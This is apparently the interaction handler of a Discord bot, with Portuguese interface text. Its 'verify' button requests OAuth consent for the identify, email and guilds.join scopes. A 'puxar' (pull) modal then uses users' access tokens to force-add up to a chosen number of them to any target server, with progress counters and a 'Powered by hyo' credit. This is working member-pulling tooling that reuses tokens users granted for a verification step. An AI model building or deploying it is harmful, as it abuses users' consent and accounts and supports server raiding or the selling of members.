const { ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const { users, config } = require('../database');
const axios = require('axios');

module.exports = {
    async handleInteraction(interaction, client) {
        if (interaction.isButton()) {
            if (interaction.customId === 'verify_button') {
                const clientId = process.env.CLIENT_ID;
                const redirectUri = encodeURIComponent(process.env.REDIRECT_URI);
                const scopes = encodeURIComponent('identify email guilds.join');
                const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scopes}`;

                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setLabel('Clique aqui para verificar')
                            .setEmoji('1470325466828374077')
                            .setStyle(ButtonStyle.Link)
                            .setURL(oauthUrl),
                    );

                await interaction.reply({
                    components: [row],
                    flags: MessageFlags.Ephemeral
                });
            } else if (interaction.customId === 'config_role') {
                const modal = new ModalBuilder().setCustomId('modal_role').setTitle('Configurar Cargo');
                const input = new TextInputBuilder().setCustomId('role_id').setLabel('ID do Cargo').setStyle(TextInputStyle.Short).setRequired(true);
                modal.addComponents(new ActionRowBuilder().addComponents(input));
                await interaction.showModal(modal);
            } else if (interaction.customId === 'config_logs') {
                const modal = new ModalBuilder().setCustomId('modal_logs').setTitle('Configurar Logs');
                const input = new TextInputBuilder().setCustomId('log_id').setLabel('ID do Canal de Logs').setStyle(TextInputStyle.Short).setRequired(true);
                modal.addComponents(new ActionRowBuilder().addComponents(input));
                await interaction.showModal(modal);
            } else if (interaction.customId === 'config_puxar') {
                const command = client.commands.get('puxar');
                if (command) await command.execute(interaction, client);
            }
        } else if (interaction.isModalSubmit()) {
            if (interaction.customId === 'modal_role') {
                const roleId = interaction.fields.getTextInputValue('role_id');
                config.set('roleId', roleId);
                await interaction.reply({ content: `Cargo de verificado atualizado para <@&${roleId}>`, flags: MessageFlags.Ephemeral });
            } else if (interaction.customId === 'modal_logs') {
                const logId = interaction.fields.getTextInputValue('log_id');
                config.set('logChannelId', logId);
                await interaction.reply({ content: `Canal de logs atualizado para <#${logId}>`, flags: MessageFlags.Ephemeral });
            } else if (interaction.customId === 'puxar_modal') {
                const amount = parseInt(interaction.fields.getTextInputValue('amount'));
                const targetGuildId = interaction.fields.getTextInputValue('target_guild');
                
                // Get all data from database
                const dbData = users.all();
                let userList = [];

                // Normalize data: wio.db .all() can return an Object { "id": {data} } or an Array [ {ID: "id", data} ]
                if (Array.isArray(dbData)) {
                    // It's an array of objects where each object has ID as a key or property
                    userList = dbData.map(item => {
                        // If it's the standard wio.db array format [ { ID: '...', data: {...} } ]
                        if (item.ID && item.data) return { id: item.ID, ...item.data };
                        // Otherwise assume it's already the user object
                        return item;
                    });
                } else if (typeof dbData === 'object' && dbData !== null) {
                    // It's an object { "id": {data} }
                    userList = Object.keys(dbData).map(key => ({
                        id: key,
                        ...dbData[key]
                    }));
                }

                // Limit to requested amount
                const toPull = userList.slice(0, amount);

                await interaction.reply({
                    content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: 0/${toPull.length}\n## -# Puxados: 0\n## -# Já estão: 0\n## -# Falhas: 0`,
                    flags: MessageFlags.Ephemeral
                });

                let pulled = 0;
                let alreadyIn = 0;
                let failed = 0;
                let processed = 0;

                for (const userData of toPull) {
                    const userId = userData.id;
                    const accessToken = userData.access_token;

                    if (!accessToken || !userId || userId === "0") {
                        console.error(`Invalid user data for index ${processed}:`, userData);
                        failed++;
                        processed++;
                        continue;
                    }

                    try {
                        const res = await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userId}`, {
                            access_token: accessToken
                        }, {
                            headers: {
                                Authorization: `Bot ${process.env.TOKEN}`,
                                'Content-Type': 'application/json'
                            },
                            validateStatus: false
                        });

                        if (res.status === 201) {
                            pulled++;
                        } else if (res.status === 204) {
                            alreadyIn++;
                        } else {
                            console.error(`Failed to pull user ${userId}. Status: ${res.status}, Data: ${JSON.stringify(res.data)}`);
                            failed++;
                        }
                    } catch (err) {
                        console.error(`Error pulling user ${userId}:`, err.message);
                        failed++;
                    }
                    processed++;

                    if (processed % 5 === 0 || processed === toPull.length) {
                        await interaction.editReply({
                            content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: ${processed}/${toPull.length}\n## -# Puxados: ${pulled}\n## -# Já estão: ${alreadyIn}\n## -# Falhas: ${failed}`
                        });
                    }
                }

                await interaction.editReply({
                    content: `# Ação completa!\n## -# Membros puxados: ${pulled}\n## -# Já estavam no servidor: ${alreadyIn}\n## -# Falhas: ${failed}`
                });
            }
        }
    }
};